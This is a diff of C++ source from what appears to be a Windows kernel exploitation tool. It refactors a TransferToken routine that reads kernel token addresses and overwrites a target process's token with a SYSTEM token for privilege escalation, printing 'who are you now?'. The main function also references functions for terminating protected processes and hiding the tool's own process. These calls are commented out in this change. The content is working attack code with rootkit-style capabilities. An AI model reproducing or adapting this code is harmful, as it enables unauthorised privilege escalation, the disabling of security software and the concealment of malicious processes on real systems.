@@ -212,22 +212,16 @@ void TransferToken(CLIENT_ID Src, CLIENT_ID Dst) {
 
 	DWORD64 DestinationTokenAddress = RetriveTokenAdress(Dst);
 	DWORD64 SourceTokenAddress = RetriveTokenAdress(Src);
-	BYTE DestinationToken[8];
-	for (int i = 0; i < 8; i++)
-		DestinationToken[i] = ReadBYTE(DestinationTokenAddress + i);
-	EX_FAST_REF* DstTokenObj = (EX_FAST_REF*)(void*)DestinationToken;
-	std::cout << "[#]Got:" << std::hex << DstTokenObj->Object << " for Process:" << (int)(DWORD)Dst.UniqueProcess << std::endl;
+	EX_FAST_REF DstTokenObj;
+	for (int i = 0; i < 8; i++) ((PCHAR)&DstTokenObj)[i] = ReadBYTE(DestinationTokenAddress + i);
+	std::cout << "[#]Got:" << std::hex << DstTokenObj.Object << " for Process:" << (int)(DWORD)Dst.UniqueProcess << std::endl;
 
-	BYTE SourceToken[8];
-	for (int i = 0; i < 8; i++)
-		SourceToken[i] = ReadBYTE(SourceTokenAddress + i);
-	EX_FAST_REF* systemtoken = (EX_FAST_REF*)(void*)SourceToken;
-	std::cout << "[#]Got:" << std::hex << systemtoken->Object << " for Process:" << (int)(DWORD)Src.UniqueProcess << std::endl;
-	std::cout << "[#]Elevating token from from:" << std::hex << DstTokenObj->Value << " To:" << std::hex << systemtoken->Value << std::endl;
-	DstTokenObj->Value = systemtoken->Value;
-	BYTE newtoken[8];
-	std::memcpy(newtoken, DstTokenObj, 8);
-	WriteBySize(8, DestinationTokenAddress, newtoken);
+	EX_FAST_REF systemtoken;
+	for (int i = 0; i < 8; i++) ((PCHAR)&systemtoken)[i] = ReadBYTE(SourceTokenAddress + i);
+	std::cout << "[#]Got:" << std::hex << systemtoken.Object << " for Process:" << (int)(DWORD)Src.UniqueProcess << std::endl;
+	std::cout << "[#]Elevating token from from:" << std::hex << DstTokenObj.Value << " To:" << std::hex << systemtoken.Value << std::endl;
+	DstTokenObj.Value = systemtoken.Value;
+	WriteBySize(8, DestinationTokenAddress, &DstTokenObj);
 	std::cout << "[#]Finished -> who are you now?" << std::endl;
 
 }
@@ -313,8 +307,8 @@ int main() {
 	CLIENT_ID ourProc = { (HANDLE)GetCurrentProcessId(), nullptr };
 	ourHandleTable = RetriveEprocessHandleTable(ourProc);
 
-	TerminateProtectedProcess(5908);
-	Sleep(-1);
+	//TerminateProtectedProcess(5908);
+	//Sleep(-1);
 	//HideMyProcess( CLIENT_ID { (HANDLE)GetCurrentProcessId(), nullptr});
 
 
